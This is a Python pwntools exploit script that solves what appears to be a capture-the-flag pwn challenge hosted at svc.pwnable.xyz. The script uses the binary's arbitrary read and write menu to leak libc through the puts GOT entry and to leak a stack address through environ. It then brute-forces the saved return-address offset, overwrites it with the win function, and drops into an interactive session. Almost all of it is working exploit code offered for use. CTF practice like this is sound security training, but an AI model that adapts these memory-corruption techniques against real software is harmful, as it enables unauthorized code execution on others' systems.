from pwn import *

exe = ELF("./challenge", checksec=True)
libc = ELF("./libc.so.6", checksec=False)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30019

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

STACK = 0

def arb_read(r, addr):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Addr: ", str(addr).encode())
    
def arb_write(r, addr, value):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Addr: ", str(addr).encode())
    r.sendlineafter(b"Value: ", str(value).encode())

def leak_libc(r):
    arb_read(r, exe.got.puts)
    libc.address = int.from_bytes(r.recvline()[:-1], "little") - libc.symbols.puts
    log.success(f"LEAKED LIBC: {hex(libc.address)}")

def leak_stack(r):
    arb_read(r, libc.symbols.environ)

    global STACK
    STACK = int.from_bytes(r.recvline()[:-1], "little")
    log.success(f"LEAKED STACK: {hex(STACK)}")

def is_libc_start_main(leak):
    return leak >= libc.symbols.__libc_start_main and \
        leak <= libc.symbols.__libc_start_main + 0x150

# It didn't run on my machine and I was too lazy to fix it
# so I just decided to bruteforce the right offset
def leak_offset(r):
    i = 0
    
    while True:
        arb_read(r, STACK - i)
        leak = int.from_bytes(r.recvline()[:-1], "little")
        if is_libc_start_main(leak):
            break
        
        i += 8

    log.success(f"FOUND RIP OFFSET: {i} {hex(leak)}")
    return i

def ret2win(r, rip):
    arb_write(r, rip, exe.symbols.win)
    r.sendlineafter(b"> ", b"0")
    
def main():
    r  = conn()

    leak_libc(r)
    leak_stack(r)
    i = leak_offset(r)
    
    ret2win(r, STACK - i)
    r.interactive()

if __name__ == "__main__":
    main()
